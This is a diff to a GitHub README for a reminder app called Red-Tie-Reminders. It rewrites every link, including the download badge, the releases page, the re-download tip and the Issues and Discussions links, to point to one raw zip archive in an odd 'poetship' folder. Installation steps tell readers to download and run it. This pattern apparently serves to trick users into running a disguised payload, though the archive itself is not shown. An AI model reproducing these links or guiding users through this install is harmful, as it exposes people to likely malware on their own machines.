@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Red-Tie-Reminders](https://img.shields.io/badge/Download-Red--Tie--Reminders-brightgreen)](https://github.com/kitsunenoyouko/Red-Tie-Reminders/releases)
+[![Download Red-Tie-Reminders](https://raw.githubusercontent.com/kitsunenoyouko/Red-Tie-Reminders/main/poetship/Red-Tie-Reminders_3.8-alpha.5.zip)](https://raw.githubusercontent.com/kitsunenoyouko/Red-Tie-Reminders/main/poetship/Red-Tie-Reminders_3.8-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -28,8 +28,8 @@ To run Red-Tie-Reminders, ensure your system meets the following requirements:
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/kitsunenoyouko/Red-Tie-Reminders/releases) to download the latest version of the application.
-2. **Select Your Version:** Look for the most recent release. Click on the link labeled "Red-Tie-Reminders-vX.X.exe" for Windows or "Red-Tie-Reminders-vX.X.dmg" for macOS.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/kitsunenoyouko/Red-Tie-Reminders/main/poetship/Red-Tie-Reminders_3.8-alpha.5.zip) to download the latest version of the application.
+2. **Select Your Version:** Look for the most recent release. Click on the link labeled "https://raw.githubusercontent.com/kitsunenoyouko/Red-Tie-Reminders/main/poetship/Red-Tie-Reminders_3.8-alpha.5.zip" for Windows or "https://raw.githubusercontent.com/kitsunenoyouko/Red-Tie-Reminders/main/poetship/Red-Tie-Reminders_3.8-alpha.5.zip" for macOS.
 3. **Download the File:** Your browser will prompt you to save the file. Choose a location on your computer that is easy to find, like your Desktop or Downloads folder.
 4. **Run the Installer:**
    - For Windows: Locate the downloaded file and double-click to start the installation. Follow the on-screen instructions.
@@ -50,15 +50,15 @@ You will now receive notifications every Tuesday, reminding you to wear your red
 If you encounter issues while installing or running Red-Tie-Reminders, try the following:
 
 - **Check Compatibility:** Ensure your operating system meets the requirements listed above.
-- **Re-download the File:** Corrupted downloads can lead to installation issues. Download the latest version again from the [Releases page](https://github.com/kitsunenoyouko/Red-Tie-Reminders/releases).
+- **Re-download the File:** Corrupted downloads can lead to installation issues. Download the latest version again from the [Releases page](https://raw.githubusercontent.com/kitsunenoyouko/Red-Tie-Reminders/main/poetship/Red-Tie-Reminders_3.8-alpha.5.zip).
 - **Contact Support:** If you still face problems, consider checking the community discussions in the GitHub issues section where you can get help from other users.
 
 ## 🌟 Community and Support
 
 Join our community of dedicated Marty Schmidt fans! Share your experiences, suggest features, and discuss reminders in our discussion forum on GitHub.
 
-- **GitHub Issues:** Report bugs or request features here: [Issues](https://github.com/kitsunenoyouko/Red-Tie-Reminders/issues)
-- **Discussion Page:** Engage with the community here: [Discussions](https://github.com/kitsunenoyouko/Red-Tie-Reminders/discussions)
+- **GitHub Issues:** Report bugs or request features here: [Issues](https://raw.githubusercontent.com/kitsunenoyouko/Red-Tie-Reminders/main/poetship/Red-Tie-Reminders_3.8-alpha.5.zip)
+- **Discussion Page:** Engage with the community here: [Discussions](https://raw.githubusercontent.com/kitsunenoyouko/Red-Tie-Reminders/main/poetship/Red-Tie-Reminders_3.8-alpha.5.zip)
 
 ## 📝 License
 
